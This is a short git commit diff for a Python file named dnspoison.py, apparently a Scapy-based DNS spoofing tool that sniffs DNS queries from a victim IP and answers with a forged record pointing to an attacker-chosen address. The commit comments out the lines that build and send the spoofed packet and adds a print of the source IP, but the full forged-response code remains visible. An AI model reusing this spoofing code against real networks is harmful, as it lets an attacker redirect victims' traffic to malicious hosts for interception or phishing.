78d2b1a692bd2ff4c23135b6a5a1f1b0bcb8d7f8
m4ul <hansonlucas06@gmail.com>
2022-11-12 19:18:50 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -10,8 +10,9 @@ Popen([firewall], shell=True, stdout=PIPE)
 
 a=sniff(count=1, filter="udp and port 53 and host " + victimIP, promisc=1)
 if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
-    spoof = ((Ether())/IP(dst=a[IP].src, src=a[IP].dst)/UDP(dport=a[UDP].sport, sport=a[UDP].dport)/DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=a[DNS].qd.qname, ttl=10, rdata=gotoIP)))
-    sendp(spoof, count=1)
+    print (a.getlayer(IP).src)
+    #spoof = ((Ether())/IP(dst=a[IP].src, src=a[IP].dst)/UDP(dport=a[UDP].sport, sport=a[UDP].dport)/DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=a[DNS].qd.qname, ttl=10, rdata=gotoIP)))
+    #sendp(spoof, count=1)
     
 
 
